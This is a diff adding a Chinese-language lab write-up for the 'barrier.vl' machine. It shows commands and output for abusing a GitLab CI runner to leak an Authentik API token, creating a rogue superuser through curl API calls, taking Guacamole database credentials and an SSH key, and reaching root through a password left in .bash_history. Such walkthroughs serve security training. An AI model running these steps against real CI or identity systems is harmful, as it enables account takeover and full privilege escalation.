@@ -600,7 +600,462 @@ Referrer-Policy: strict-origin-when-cross-origin
 %3D%3D 要变成 ==（URL解码）
 ```
 ![图片](images/2026040209.png)
+### CI/CD
+#### 在akdamin的下面‘admin' -> 'CI/CD' -> 'Runners' -> '#1 (sT3k7uGUy)' -> 'Hide details'
+```
+Tags: auto_5e7f
+```
+```
+r_UoO8ZxRAxNdi	
+Online Idle 	17.6.0 (374d34fd) 	172.17.0.1	docker	amd64/linux	40 minutes ago
+```
+#### 如果我们创建一个新的仓库，并为其提供一个引用此运行器标签 auto_5e7f 的构建文件，那么它将自动由该运行器进行构建。当作业开始时，运行器会拉取我们在构建文件中指定的镜像，并从该镜像启动一个全新的容器。然后我们还可以指定在该容器内执行的命令。
+#### 要创建构建文件，我们需要找到主机上已存在的 Docker 镜像。我们可以假设 redis:alpine 或 postgres:16-alpine 可能已经存在，因为它们是 Authentik 的 Docker Compose 安装说明中使用的镜像。在该页面中，我们还看到 Authentik 的默认用户是 akadmin，并且 Docker 容器环境变量包含 Authentik 的密钥。
+https://docs.goauthentik.io/install-config/install/docker-compose
+#### 所以此时我们将尝试利用该运行器。我们可以在新生成的 Docker 容器中获取反向 shell，但会被限制在该环境中。或者我们可以推测可能存在敏感信息的位置。当容器启动时，它会从运行器的执行环境中继承环境变量，这很可能意味着它会包含 Authentik 的密钥。
+#### 如果这个变量被暴露出来，那么或许它可以作为我们的认证令牌，我们可以用它来查询 API，从而为我们利用 Authentik 开启多种功能（如手册中所述）。由于 Authentik 似乎是该系统中大多数服务的访问授权服务，所以它是一个不错的下一个目标。
+https://api.goauthentik.io/
+#### 首先，点击“Resume”来激活运行器。然后，我们将创建一个新项目。
+#### 'Overview' -> 'projects' -> 'New Project' -> 'Create blank project'
+![图片](images/2026040210.png)
+#### 接下来，我们将通过指定“redis:alpine”或“postgres:16-alpine”作为镜像、运行器标签以及我们希望在启动时执行的命令来创建构建文件 .gitlab-ci.yml。在这种情况下，我们将使用“env”命令来显示容器的环境变量。
+```
+#.gitlab-ci.yml
 
+image:
+    name: redis:alpine
+    pull_policy: if-not-present
+
+stages:
+  - build 
+
+job_build:
+  stage: build
+  script:
+    - env
+  tags:
+    - auto_5e7f
+```
+#### 将.gitlab-ci.yml文件：'Download'后‘Upload new file' 
+#### 接下来，我们可以查看“Jobs”部分，那里应该已经有一个名为“job_build”的新任务了。
+#### 我们看到一个新的 Docker 容器被启动，它为我们执行了“env”命令。
+![图片](images/2026040211.png)
+#### 再向下滚动一点，我们就能找到“AUTHENTIK_TOKEN”这个参数了。
+```
+98 AUTHENTIK_TOKEN=MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc
+```
+### Authentik
+#### 既然我们已经找到了 Authentik 令牌，就可以尝试用它来进行授权以访问 API 的各种功能。根据手册，让我们通过使用 cURL 向 /api/v3/core/users 端点发送 GET 请求来查看注册用户账户。
+https://api.goauthentik.io/reference/core-users-list/
+<details>
+<summary>curl -L 'http://barrier.vl:9000/api/v3/core/users/' -H 'Authorization: bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' | jq</summary>
+
+```
+[★]$ curl -L 'http://barrier.vl:9000/api/v3/core/users/' -H 'Authorization: bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' | jq
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  4308  100  4308    0     0  27556      0 --:--:-- --:--:-- --:--:-- 27439
+{
+  "pagination": {
+    "next": 0,
+    "previous": 0,
+    "count": 4,
+    "current": 1,
+    "total_pages": 1,
+    "start_index": 1,
+    "end_index": 4
+  },
+  "results": [
+    {
+      "pk": 2,
+      "username": "ak-outpost-af1fa701dddb44f98ddf2c3868733303",
+      "name": "Outpost authentik Embedded Outpost Service-Account",
+      "is_active": true,
+      "last_login": null,
+      "is_superuser": false,
+      "groups": [],
+      "groups_obj": [],
+      "email": "",
+      "avatar": "<SNIP>",
+      "attributes": {},
+      "uid": "2698567113c1ff76765c3baaa33db04c022784564d91d0c65ef03f41961282cf",
+      "path": "goauthentik.io/outposts",
+      "type": "internal_service_account",
+      "uuid": "3737be82-3c55-4195-b639-478c339edb35"
+    },
+    {
+      "pk": 4,
+      "username": "akadmin",
+      "name": "authentik Default Admin",
+      "is_active": true,
+      "last_login": "2025-06-18T09:25:04.724776Z",
+      "is_superuser": true,
+      "groups": [
+        "a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8" 			<-------
+      ],
+      "groups_obj": [
+        {
+          "pk": "a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8",
+          "num_pk": 21741,
+          "name": "authentik Admins",
+          "is_superuser": true,
+          "parent": null,
+          "parent_name": null,
+          "attributes": {}
+        }
+      ],
+      "email": "admin@barrier.vl",
+      "avatar": "<SNIP>",
+      "attributes": {},
+      "uid": "c19f414ee26028d6fe42f90a393920de1c1f8b5428d3efe76b72f302efe78742",
+      "path": "users",
+      "type": "internal",
+      "uuid": "4d9587ad-641d-4879-a8dd-edf2a24e1bf5"
+    },
+    {
+      "pk": 35,
+      "username": "maki",
+      "name": "maki",
+      "is_active": true,
+      "last_login": null,
+      "is_superuser": false,
+      "groups": [],
+      "groups_obj": [],
+      "email": "",
+      "avatar": "<SNIP>",
+      "attributes": {},
+      "uid": "6d9a5a5ca034c7dd59f0b63547f402ceed837476b2b43bc58338ed74630b8651",
+      "path": "users",
+      "type": "internal",
+      "uuid": "5840e7f6-f396-493a-b41d-9433df6df996"
+    },
+    {
+      "pk": 34,
+      "username": "satoru",
+      "name": "satoru",
+      "is_active": true,
+      "last_login": "2026-04-02T07:52:51.177022Z",
+      "is_superuser": false,
+      "groups": [],
+      "groups_obj": [],
+      "email": "satoru@barrier.vl",
+      "avatar": "<SNIP>",
+      "attributes": {},
+      "uid": "e0c306c91c800ecb0343d535bf8211fcd85ebeafb17966eb9a5b5146c99724cb",
+      "path": "users",
+      "type": "internal",
+      "uuid": "91da4edd-f03d-4cdc-80af-102371b10905"
+    }
+  ]
+}
+```
+</details>
+
+#### 这显示了 4 个现有的用户：akadmin、satoru、maki 以及 authentik 服务账户。它也会显示哪些用户是超级用户，甚至还会显示“认证管理员”组的信息。
+#### 此时，我们可以尝试更改现有超级用户的密码，比如“akadmin”，或者我们也可以
+#### 创建自己的超级用户！让我们使用相同的端点，但这次我们将提供一些数据来创建用户“superadmin”。按照文档说明，我们不能在这里设置密码，但稍后我们会使用另一个功能。
+```
+[★]$ curl -L 'http://barrier.vl:9000/api/v3/core/users/' -H 'Content-Type: application/json' -H 'Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' -d '{ "username": "superadmin", "name": "superadmin"}' jq
+{"pk":36,"username":"superadmin","name":"superadmin","is_active":true,"last_login":null,"is_superuser":false,"groups":[],"groups_obj":[],"email":"","avatar":"<SNIP>","attributes":{},"uid":"0e89e359cf32c3efeecb057458a53528a5b799dd5067d7915bd7a15e082dbb74","path":"users","type":"internal","uuid":"34d6027a-4477-4757-8312-279b20f52d95"}curl: (6) Could not resolve host: jq
+```
+#### 我们的用户已创建完成，我们可以获取用户的 pk 或 ID，然后通过端点 /api/v3/core/users/{pk}/set_password/ 来设置密码：
+```
+[★]$ curl -L 'http://barrier.vl:9000/api/v3/core/users/36/set_password/' -H 'Content-Type: application/json' -H 'Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' -d '{ "password": "Pa$$word123!"}'
+```
+#### 最后，并没有特定的步骤可以将我们的用户直接设置为超级用户。不过，我们可以将他们添加到 authentik 管理员组中，这样他们就能继承权限并成为超级用户。我们将针对端点 /api/v3/core/groups/{group_uuid}/add_user/ 进行操作，其中我们会包含组的 PK，然后在请求体中提供我们用户的 PK。
+```
+[★]$ curl -L 'http://barrier.vl:9000/api/v3/core/groups/a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8/add_user/' -H 'Content-Type: application/json' -H 'Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' -d '{ "pk": 36}'
+```
+#### 如果我们再次列出用户列表，就能确认我们的更改是否生效。我们应当能在列表的末尾看到新添加的用户，其“is_superuser”参数已被设置为“true”：
+<details>
+<summary>curl -L 'http://barrier.vl:9000/api/v3/core/users/' -H 'Authorization: bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' | jq</summary>
+	
+```
+[★]$ curl -L 'http://barrier.vl:9000/api/v3/core/users/' -H 'Authorization: bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' | jq
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  5455  100  5455    0     0  39991      0 --:--:-- --:--:-- --:--:-- 40110
+{
+  "pagination": {
+    "next": 0,
+    "previous": 0,
+    "count": 5,
+    "current": 1,
+    "total_pages": 1,
+    "start_index": 1,
+    "end_index": 5
+  },
+  "results": [
+    {
+      "pk": 2,
+      "username": "ak-outpost-af1fa701dddb44f98ddf2c3868733303",
+      "name": "Outpost authentik Embedded Outpost Service-Account",
+      "is_active": true,
+      "last_login": null,
+      "is_superuser": false,
+      "groups": [],
+      "groups_obj": [],
+      "email": "",
+      "avatar": "<SNIP>",
+      "attributes": {},
+      "uid": "2698567113c1ff76765c3baaa33db04c022784564d91d0c65ef03f41961282cf",
+      "path": "goauthentik.io/outposts",
+      "type": "internal_service_account",
+      "uuid": "3737be82-3c55-4195-b639-478c339edb35"
+    },
+    {
+      "pk": 4,
+      "username": "akadmin",
+      "name": "authentik Default Admin",
+      "is_active": true,
+      "last_login": "2025-06-18T09:25:04.724776Z",
+      "is_superuser": true,
+      "groups": [
+        "a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8"
+      ],
+      "groups_obj": [
+        {
+          "pk": "a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8",
+          "num_pk": 21741,
+          "name": "authentik Admins",
+          "is_superuser": true,
+          "parent": null,
+          "parent_name": null,
+          "attributes": {}
+        }
+      ],
+      "email": "admin@barrier.vl",
+      "avatar": "<SNIP>",
+      "attributes": {},
+      "uid": "c19f414ee26028d6fe42f90a393920de1c1f8b5428d3efe76b72f302efe78742",
+      "path": "users",
+      "type": "internal",
+      "uuid": "4d9587ad-641d-4879-a8dd-edf2a24e1bf5"
+    },
+    {
+      "pk": 35,
+      "username": "maki",
+      "name": "maki",
+      "is_active": true,
+      "last_login": null,
+      "is_superuser": false,
+      "groups": [],
+      "groups_obj": [],
+      "email": "",
+      "avatar": "<SNIP>",
+      "attributes": {},
+      "uid": "6d9a5a5ca034c7dd59f0b63547f402ceed837476b2b43bc58338ed74630b8651",
+      "path": "users",
+      "type": "internal",
+      "uuid": "5840e7f6-f396-493a-b41d-9433df6df996"
+    },
+    {
+      "pk": 34,
+      "username": "satoru",
+      "name": "satoru",
+      "is_active": true,
+      "last_login": "2026-04-02T07:52:51.177022Z",
+      "is_superuser": false,
+      "groups": [],
+      "groups_obj": [],
+      "email": "satoru@barrier.vl",
+      "avatar": "<SNIP>",
+      "attributes": {},
+      "uid": "e0c306c91c800ecb0343d535bf8211fcd85ebeafb17966eb9a5b5146c99724cb",
+      "path": "users",
+      "type": "internal",
+      "uuid": "91da4edd-f03d-4cdc-80af-102371b10905"
+    },
+    {
+      "pk": 36,
+      "username": "superadmin",
+      "name": "superadmin",
+      "is_active": true,
+      "last_login": null,
+      "is_superuser": true,
+      "groups": [
+        "a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8"
+      ],
+      "groups_obj": [
+        {
+          "pk": "a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8",
+          "num_pk": 21741,
+          "name": "authentik Admins",
+          "is_superuser": true,
+          "parent": null,
+          "parent_name": null,
+          "attributes": {}
+        }
+      ],
+      "email": "",
+      "avatar": "SNIP>",
+      "attributes": {},
+      "uid": "0e89e359cf32c3efeecb057458a53528a5b799dd5067d7915bd7a15e082dbb74",
+      "path": "users",
+      "type": "internal",
+      "uuid": "34d6027a-4477-4757-8312-279b20f52d95"
+    }
+  ]
+}
+```
+</details>
+
+#### 这意味着我们现在可以以超级用户身份通过以下网址登录到 Authentik：https://barrier.vl:9443 
+![图片](images/2026040212.png)
+#### 在仪表板的右上角，我们应该能够看到“Admin interface”
+#### Directory -> Users
+#### 看来我们能够冒充用户并获取他们的权限。仔细查看了每一个用户后，maki 似乎是唯一值得冒充的对象，因为他们在“Guacamole ”系统中有访问权限，而且该系统中已有连接存在。
+#### 点击 maki的‘Impersonate'
+![图片](images/2026040213.png)
+#### 点击 ‘Guacamole',找到终端‘>_ Maintenance'
+```
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-168-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Thu Apr  2 09:59:38 AM UTC 2026
+
+  System load:  0.1                Processes:             311
+  Usage of /:   77.1% of 14.17GB   Users logged in:       0
+  Memory usage: 68%                IPv4 address for eth0: 10.129.234.46
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+18 additional security updates can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+maki@barrier:~$ cat user.txt
+```
+### Privilege Escalation
+```
+maki@barrier:/etc/guacamole$ ls -la
+total 20
+drwxr-xr-x   4 root root 4096 Dec 26  2024 .
+drwxr-xr-x 111 root root 4096 Feb  2 11:08 ..
+drwxr-xr-x   2 root root 4096 Dec 22  2024 extensions
+-rw-r--r--   1 root root  703 Dec 26  2024 guacamole.properties
+drwxr-xr-x   2 root root 4096 Dec 22  2024 lib
+maki@barrier:/etc/guacamole$ ^C
+maki@barrier:/etc/guacamole$ cat guacamole.properties
+# MySQL properties
+mysql-hostname: 127.0.0.1
+mysql-port: 3306
+mysql-database: guac_db
+mysql-username: guac_user
+mysql-password: guac2024
+<SNIP>
+```
+#### 让我们连接到“guac_db”数据库，看看能否找到任何有用的信息。
+```
+maki@barrier:/etc/guacamole$ mysql -u guac_user -pguac2024 guac_db
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 33
+Server version: 10.6.23-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [guac_db]>
+```
+#### 让我们列出现有的表格
+```
+MariaDB [guac_db]> show tables;
++---------------------------------------+
+| Tables_in_guac_db                     |
++---------------------------------------+
+| guacamole_connection                  |
+| guacamole_connection_attribute        |
+| guacamole_connection_group            |
+| guacamole_connection_group_attribute  |
+| guacamole_connection_group_permission |
+| guacamole_connection_history          |
+| guacamole_connection_parameter        |
+| guacamole_connection_permission       |
+| guacamole_entity                      |
+| guacamole_sharing_profile             |
+| guacamole_sharing_profile_attribute   |
+| guacamole_sharing_profile_parameter   |
+| guacamole_sharing_profile_permission  |
+| guacamole_system_permission           |
+| guacamole_user                        |
+| guacamole_user_attribute              |
+| guacamole_user_group                  |
+| guacamole_user_group_attribute        |
+| guacamole_user_group_member           |
+| guacamole_user_group_permission       |
+| guacamole_user_history                |
+| guacamole_user_password_history       |
+| guacamole_user_permission             |
++---------------------------------------+
+23 rows in set (0.000 sec)
+```
+#### 浏览这些表格后可以发现，其中包含最有用信息的表格是“guacamole_connection_parameter”，因为它包含了“maki_adm”的私钥和密码。
+```
+MariaDB [guac_db]> select * from guacamole_connection_parameter;
+| connection_id | parameter_name | parameter_value
+|             1 | port           | 22
+|             2 | passphrase     | 3V32FN6oViMPxyzC
+|             2 | port           | 22
+|             2 | private-key    | -----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,641356448A934274F5411C859C1FE00F
+<SNIP>
+-----END RSA PRIVATE KEY-----
+|             2 | username       | maki_adm      
+```
+#### 现在我们可以尝试使用密钥和密码“3V32FN6oViMPxyzC”通过 SSH 进行连接
+```
+[★]$ chmod 600 maki_adm
+
+[★]$ ssh -i maki_adm maki_adm@barrier.vl -oHostKeyAlgorithms=+ssh-rsa 
+The authenticity of host 'barrier.vl (10.129.234.46)' can't be established.
+RSA key fingerprint is SHA256:GCkGAQTxizCkIcpuBSCr79rJ/Al5wn745cwFDs+dY4A.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'barrier.vl' (RSA) to the list of known hosts.
+Enter passphrase for key 'maki_adm': 
+<SNIP>
+maki_adm@barrier:~$
+```
+#### 由于我们已经成功连接成功，首先我们注意到的是，.bash_history 文件中包含了一些数据
+```
+maki_adm@barrier:~$ ls -la
+total 32
+drwxr-x--- 4 maki_adm admin 4096 Dec 22  2024 .
+drwxr-xr-x 5 root     root  4096 Dec 23  2024 ..
+-rw-r--r-- 1 root     root    26 Dec 22  2024 .bash_history
+-rw-r--r-- 1 maki_adm admin  220 Dec 22  2024 .bash_logout
+-rw-r--r-- 1 maki_adm admin 3771 Dec 22  2024 .bashrc
+drwx------ 2 maki_adm admin 4096 Dec 22  2024 .cache
+-rw-r--r-- 1 maki_adm admin  807 Dec 22  2024 .profile
+drwxrwxr-x 2 maki_adm admin 4096 Dec 22  2024 .ssh
+-rw-r--r-- 1 maki_adm admin    0 Dec 22  2024 .sudo_as_admin_successful
+```
+#### ...
+```
+maki_adm@barrier:~$ cat .bash_history
+sudo su 
+Va4kSjgTHSd55ZLv
+
+maki_adm@barrier:~$ sudo su
+[sudo] password for maki_adm: 
+root@barrier:/home/maki_adm#
+root@barrier:~# cat root.txt
+```
 __________________
 ### 遇到的困难：
 #### [1]使用burpsuite好难拦截到GET的SAMLResponse，但是网页上的Fn12就很简单就有了SAMLResponse了
